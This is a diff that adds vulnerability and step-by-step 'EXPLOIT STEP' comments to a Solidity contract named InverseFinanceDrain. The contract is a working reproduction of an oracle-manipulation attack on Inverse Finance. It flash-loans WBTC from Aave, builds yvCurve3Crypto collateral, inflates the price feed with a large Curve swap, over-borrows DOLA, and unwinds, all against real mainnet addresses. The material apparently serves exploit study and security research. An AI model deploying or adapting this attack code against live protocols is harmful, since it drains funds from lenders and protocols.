@@ -14,6 +14,11 @@ pragma solidity ^0.8.10;
 // manipulation-resistant source. A single large WBTC→USDT swap inflates the
 // reported price ~2.89×, letting the attacker over-borrow DOLA against the
 // over-valued collateral, then reverse the swap and convert the DOLA to WBTC.
+//
+// VULNERABILITY: Oracle relies on manipulable on-chain spot balances for pricing collateral (see YVCrv3CryptoFeed.latestAnswer).
+// Preconditions: 1) Collateral market (anYvCrv3CryptoInverse) uses this feed for getUnderlyingPrice; 2) large flash liquidity
+// available on Aave+Curve; 3) attacker can open collateral position + borrow in same tx before price reverts.
+// Impact: DOLA market lenders / protocol lose the delta between inflated and true collateral value (attacker profit extracted in WBTC).
 
 interface IERC20 {
     function balanceOf(address) external view returns (uint256);
@@ -74,6 +79,7 @@ contract InverseFinanceDrain {
     ICErc20 constant InverseFinanceDola = ICErc20(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);
 
     function run() external {
+        // EXPLOIT STEP 0: Deployed attacker contract initiates Aave flashloan of WBTC. All logic self-contained so playground / tests can call run().
         address[] memory assets = new address[](1);
         assets[0] = address(WBTC);
         uint256[] memory amounts = new uint256[](1);
@@ -98,6 +104,7 @@ contract InverseFinanceDrain {
         params;
         initiator;
 
+        // EXPLOIT STEP 1: Max approvals for the Curve registry (for swaps), Yearn, and token movements.
         WBTC.approve(address(curveVyper_contract), type(uint256).max);
         WBTC.approve(address(curveRegistry), type(uint256).max);
         IUSDT(address(0xdAC17F958D2ee523a2206206994597C13D831ec7)).approve(
@@ -107,8 +114,12 @@ contract InverseFinanceDrain {
         crv3crypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA, type(uint256).max);
 
         uint256[3] memory amounts2 = [uint256(0), 22_500_000_000, 0];
+
+        // EXPLOIT STEP 2/3: Add liq to Curve -> receive crv LP; deposit to Yearn yvCurve3Crypto to wrap into yv token.
         curveVyper_contract.add_liquidity(amounts2, 0);
         yvCurve3Crypto.deposit(5_375_596_969_399_930_881_565, address(this));
+
+        // EXPLOIT STEP 4: Mint cTokens by supplying yv as collateral to Inverse's Yearn-3Crypto cToken market; enter the market.
         yvCurve3Crypto.approve(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587, type(uint256).max);
         anYvCrv3CryptoInverse.mint(4_906_754_677_503_974_414_310);
 
@@ -116,13 +127,23 @@ contract InverseFinanceDrain {
         toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;
         Unitroller.enterMarkets(toEnter);
 
+        // VULNERABILITY: See detailed explanation in InverseFinance_exp.sol (same root cause).
+        // The feed's latestAnswer uses manipulable Curve pool balances. The large WBTC->USDT swap below inflates the price of the collateral.
+        // Impact: Over-borrow on DOLA market drains value from the protocol.
+
         curveRegistry.exchange(
             address(curveVyper_contract), address(WBTC), address(0xdAC17F958D2ee523a2206206994597C13D831ec7), 2_677_500_000_000, 0, address(this)
         );
+
+        // EXPLOIT STEP 5: Execute the borrow of DOLA using the inflated collateral valuation from the manipulated oracle.
         InverseFinanceDola.borrow(10_133_949_192_393_802_606_886_848);
+
+        // EXPLOIT STEP 6: Reverse-swap to rebalance Curve pool (undoing the manipulation) and convert back to WBTC.
         curveRegistry.exchange(
             address(curveVyper_contract), address(0xdAC17F958D2ee523a2206206994597C13D831ec7), address(WBTC), 75_403_376_186_072, 0, address(this)
         );
+
+        // EXPLOIT STEP 7: Route borrowed DOLA through pools to USDT then WBTC. Repay flashloan, profit left in contract.
         curveRegistry.exchange(
             address(dola3pool3crv), address(DOLA), address(crv3), 10_133_949_192_393_802_606_886_848, 0, address(this)
         );
